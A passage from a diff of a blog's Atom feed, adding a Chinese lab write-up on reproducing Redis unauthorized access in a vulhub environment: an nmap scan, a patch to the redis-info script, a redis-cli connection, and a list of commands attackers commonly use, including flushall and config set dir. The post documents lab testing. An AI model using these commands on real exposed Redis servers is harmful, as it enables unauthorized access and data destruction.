data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# dirmap 显示没有安装模块，尽管已经安装&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python3 -m pip &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;模块名字&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+        <category term="MacOS" scheme="https://mo-onstudy.com/tags/MacOS/" />
+        <category term="centos" scheme="https://mo-onstudy.com/tags/centos/" />
+        <category term="iterm" scheme="https://mo-onstudy.com/tags/iterm/" />
+        <category term="terminal" scheme="https://mo-onstudy.com/tags/terminal/" />
+        <category term="bash" scheme="https://mo-onstudy.com/tags/bash/" />
+        <category term="shell" scheme="https://mo-onstudy.com/tags/shell/" />
+        <updated>2022-01-09T04:23:39.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://mo-onstudy.com/2021/12/31/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
+        <title>redis未授权访问</title>
+        <link rel="alternate" href="https://mo-onstudy.com/2021/12/31/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;前几日配置爬虫 IP 代理池时安装了 redis，今天在使用 goby 又扫描到一个 redis 未授权访问漏洞，不敢深入挖掘，所以记录一下在靶场环境的复现过程&lt;/p&gt;
+&lt;h2 id=&#34;环境介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境介绍&#34;&gt;#&lt;/a&gt; 环境介绍&lt;/h2&gt;
+&lt;p&gt;攻击机器：&lt;span class=&#34;kbd red&#34;&gt;macOS&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;攻击 IP：&lt;span class=&#34;kbd red&#34;&gt;192.168.1.8&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;目标机器：&lt;span class=&#34;kbd red&#34;&gt;centos7&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;目标 IP：&lt;span class=&#34;kbd red&#34;&gt;192.168.1.16&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;复现步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现步骤&#34;&gt;#&lt;/a&gt; 复现步骤&lt;/h2&gt;
+&lt;h3 id=&#34;靶场搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#靶场搭建&#34;&gt;#&lt;/a&gt; 靶场搭建&lt;/h3&gt;
+&lt;p&gt;在&lt;span class=&#34;kbd red&#34;&gt; centos7&lt;/span&gt; 使用 [&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dWxodWIub3JnLw==&#34;&gt;vulhub&lt;/span&gt;]{.kbd .red} 搭建&lt;span class=&#34;kbd red&#34;&gt; redis 未授权访问&lt;/span&gt;漏洞环境&lt;/p&gt;
+&lt;h3 id=&#34;复现步骤-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现步骤-2&#34;&gt;#&lt;/a&gt; 复现步骤&lt;/h3&gt;
+&lt;p&gt;使用 nmap 查询信息&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -A -p &lt;span class=&#34;token number&#34;&gt;6379&lt;/span&gt; --script&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;redis-info &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.1.16&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;显示脚本运行错误&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211231141352688.png&#34; alt=&#34;image-20211231141352688&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;根据&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL25tYXAvbm1hcC9pc3N1ZXMvMjI5Ng==&#34;&gt;大佬的解决方法&lt;/span&gt;修改 redis-info.nes 脚本第 139 行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-scripts&#34;&gt;for _, item in ipairs(restab) do
+	local ip = item:match(&amp;quot;addr=%[?([0-9a-f:.]+)%]?:[0-9]+ &amp;quot;)
+	if not item or 0 == #item then 
+		break
+	end
+	client_ips[ip] = true;
+end
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;脚本运行成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211231141757800.png&#34; alt=&#34;image-20211231141757800&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用 redis-cli 连接目标机器的 redis 数据库&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;cd&lt;/span&gt; /usr/local/redis/bin&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./redis-cli -h &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.1.16&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/moonoon20/images@main/uPic/image-20211231143204723.png&#34; alt=&#34;image-20211231143204723&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;附 攻击者常用命令&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;info                       			查看信息     
+flushall                 	 			删除所有数据库内容：
+flushdb                   			刷新数据库
+看所有键：KEYS *，使用select num  可以查看键值数据。
+set test &amp;quot;who am i&amp;quot;        			设置变量
+config set dir dirpath     			设置路径等配置
+config get dir/dbfilename  			获取路径及数据配置信息
+save                       			保存
+get                        			变量，查看变量名称
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;遇到的错误&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 错误&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; are disabled, because this instance is configured to report errors during writes &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; RDB snapshotting fails &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stop-writes-on-bgsave-error option&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;. Please check the Redis logs &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; details about the RDB error&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 解决&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; stop-writes-on-bgsave-error no&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 错误&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;READONLY You can&#39;t &lt;span class=&#34;token function&#34;&gt;write&lt;/span&gt; against a &lt;span class=&#34;token builtin class-name&#34;&gt;read&lt;/span&gt; only slave &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 解决&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; slave-read-only no&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 查看&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config get slave-read-only&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+        <category term="redis" scheme="https://mo-onstudy.com/tags/redis/" />
+        <category term="未授权访问" scheme="https://mo-onstudy.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" />
+        <category term="漏洞复现" scheme="https://mo-onstudy.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" />
+        <updated>2021-12-31T05:59:06.000Z</updated>
+    </entry>
     <entry>
         <id>https://mo-onstudy.com/2021/12/27/Python%E7%88%AC%E8%99%AB%E4%BB%A3%E7%90%86IP%E6%B1%A0%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</id>
         <title>Python爬虫代理IP池的搭建与使用</title>
@@ -410,6 +880,6 @@
 &lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
 </content>
-        <updated>2021-12-19T13:25:10.943Z</updated>
+        <updated>2021-12-19T13:25:10.000Z</updated>
     </entry>
 </feed>
